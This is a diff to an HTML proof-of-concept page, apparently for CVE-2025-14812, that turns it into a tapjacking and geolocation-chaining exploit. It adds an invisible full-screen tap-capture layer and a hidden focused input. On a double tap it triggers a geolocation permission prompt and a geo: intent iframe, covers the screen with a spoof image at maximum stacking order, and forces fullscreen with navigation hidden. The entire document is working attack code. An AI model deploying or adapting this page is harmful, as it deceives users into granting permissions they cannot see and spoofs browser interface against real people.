@@ -2,13 +2,14 @@
 <html lang="en">
   <head>
     <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>CVE-2025-14812 Enhanced PoC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" />
+    <title>Advanced Tapjacking & Geolocation Chaining PoC</title>
     <style>
       body, html {
         margin: 0;
         padding: 0;
         height: 100%;
+        width: 100%;
         background: #0b0e14;
         font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
         color: #f0f6fc;
@@ -17,7 +18,15 @@
         justify-content: center;
         overflow: hidden;
       }
-      .container { text-align: center; max-width: 650px; padding: 20px; box-sizing: border-box; }
+      #fullscreenElement {
+        position: relative;
+        width: 100%;
+        height: 100%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .container { text-align: center; max-width: 650px; padding: 20px; box-sizing: border-box; z-index: 10; }
       button {
         width: 100%;
         max-width: 360px;
@@ -31,6 +40,8 @@
         cursor: pointer;
         box-shadow: 0 4px 14px rgba(218, 54, 51, 0.4);
         transition: transform 0.1s, background 0.2s;
+        position: relative;
+        z-index: 5;
       }
       button:active { background: #b62324; transform: scale(0.98); }
       .info {
@@ -41,53 +52,151 @@
         word-break: break-all;
         padding: 0 10px;
       }
+      #spoof {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        min-width: 100vw;
+        min-height: 100vh;
+        object-fit: cover;
+        z-index: 2147483647;
+        pointer-events: none;
+      }
+      /* Tapjacking transparent overlay layer untuk menangkap gestur klik ganda */
+      #tapjackLayer {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        z-index: 6;
+        background: transparent;
+        cursor: pointer;
+      }
     </style>
+    <script>
+      addEventListener("touchstart", (event) => {});
+      window.ontouchstart = (event) => {
+        let input = document.getElementById("focusInput");
+        if (input) input.focus();
+      };
+      
+      addEventListener("touchend", (event) => {});
+      window.ontouchend = (event) => {
+        let input = document.getElementById("focusInput");
+        if (input) input.blur();
+      };
+    </script>
   </head>
   <body>
-    <div class="container">
-      <button id="execBtn">INITIALIZE ENHANCED SPOOF</button>
-      <div class="info" id="statusInfo">Status: Ready for interaction.</div>
+    <input id="focusInput" style="width: 0px; height: 0px; border: none; outline: none; background: transparent; position: absolute; opacity: 0;" />
+
+    <div id="fullscreenElement">
+      <!-- Tapjack invisible interaction layer -->
+      <div id="tapjackLayer"></div>
+
+      <img id="spoof" style="display: none;" src="spoof.png" alt="Spoof Layer">
+
+      <div class="container" id="mainContainer">
+        <button id="execBtn">INITIALIZE TAPJACK & GEO CHAIN</button>
+        <div class="info" id="statusInfo">Status: Ready for double-tap interaction.</div>
+      </div>
     </div>
 
     <script>
       let execButton = document.getElementById("execBtn");
       let statusInfo = document.getElementById("statusInfo");
+      let tapjackLayer = document.getElementById("tapjackLayer");
+      let clickCount = 0;
 
-      execButton.onclick = function () {
-        statusInfo.innerText = "Status: Deploying context vector & triggering intent...";
-        this.style.display = "none";
+      // Fungsi utama eksekusi berantai berbasis tapjacking & geolocation focus
+      async function triggerBypassSequence() {
+        statusInfo.innerText = "Status: Executing double-tap geolocation & spoof chain...";
+        execButton.style.display = "none";
+        tapjackLayer.style.display = "none";
 
         try {
-          // Membangun elemen iframe pemicu skema URI secara dinamis dan bersih
+          // 1. Memicu Permission Prompt Geolocation secara langsung memanfaatkan gesture pengguna
+          if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+              (pos) => { console.debug("Geo acquired:", pos.coords.latitude); },
+              (err) => { console.debug("Geo prompt handled/denied:", err.message); },
+              { timeout: 5000, maximumAge: 0 }
+            );
+          }
+
+          // 2. Intent URI dispatcher untuk memicu dialog eksternal tambahan
           let spoofFrame = document.createElement("iframe");
           spoofFrame.style.display = "none";
           spoofFrame.src = "geo:0,0?q=apple.com";
-          
-          // Menyematkan frame ke body untuk langsung mengeksekusi intent dialog sistem
           document.body.appendChild(spoofFrame);
-          statusInfo.innerText = "Status: Intent dispatched. Locking view in 2 seconds...";
 
-          // Eksekusi penguncian Fullscreen secara presisi setelah jeda 2 detik
-          setTimeout(() => {
-            let docElement = document.documentElement;
+          // 3. Deployment visual spoof.png overlay
+          let spoofImg = document.getElementById("spoof");
+          if (spoofImg) {
+            spoofImg.style.display = "block";
+          }
+
+          statusInfo.innerText = "Status: Geolocation prompt active. Engaging Fullscreen lock...";
+
+          // 4. Eksekusi Fullscreen agresif dengan jeda sinkronisasi
+          setTimeout(async () => {
+            let fsElement = document.getElementById("fullscreenElement") || document.documentElement;
             
-            let requestFS = docElement.requestFullscreen || 
-                            docElement.webkitRequestFullscreen || 
-                            docElement.mozRequestFullScreen || 
-                            docElement.msRequestFullscreen;
+            let requestFS = fsElement.requestFullscreen || 
+                            fsElement.webkitRequestFullscreen || 
+                            fsElement.mozRequestFullScreen || 
+                            fsElement.msRequestFullscreen;
 
             if (requestFS) {
-              requestFS.call(docElement).catch((err) => {
-                console.debug("Fullscreen execution deferred:", err.message);
-              });
+              try {
+                await requestFS.call(fsElement, { navigationUI: "hide" });
+              } catch (err) {
+                try {
+                  await requestFS.call(fsElement);
+                } catch (e) {
+                  console.debug("Fullscreen fallback error:", e.message);
+                }
+              }
+            }
+
+            let container = document.getElementById("mainContainer");
+            if (container) {
+              container.style.display = "none";
             }
             
-            statusInfo.innerText = "Status: Viewport locked and secured.";
-          }, 2000);
+            statusInfo.innerText = "Status: Tapjack & Geolocation chain locked.";
+          }, 350);
 
         } catch (err) {
-          statusInfo.innerText = "Status: Critical execution error: " + err.message;
+          statusInfo.innerText = "Status: Execution error: " + err.message;
           execButton.style.display = "block";
+          tapjackLayer.style.display = "block";
+        }
+      }
+
+      // Mekanisme Tapjacking / Double-Tap Listener pada layer transparan
+      tapjackLayer.onclick = function (e) {
+        clickCount++;
+        if (clickCount === 1) {
+          statusInfo.innerText = "Status: First tap registered. Tap once more to confirm focus...";
+          // Memaksa fokus awal pada elemen tersembunyi
+          let input = document.getElementById("focusInput");
+          if (input) input.focus();
+        } else if (clickCount >= 2) {
+          // Ketukan kedua memicu rangkaian eksploitasi penuh secara otomatis
+          triggerBypassSequence();
+        }
+      };
+
+      execButton.onclick = function () {
+        clickCount++;
+        if (clickCount >= 2) {
+          triggerBypassSequence();
+        } else {
+          statusInfo.innerText = "Status: Tap confirmed. Press again to execute chain.";
         }
       };
     </script>
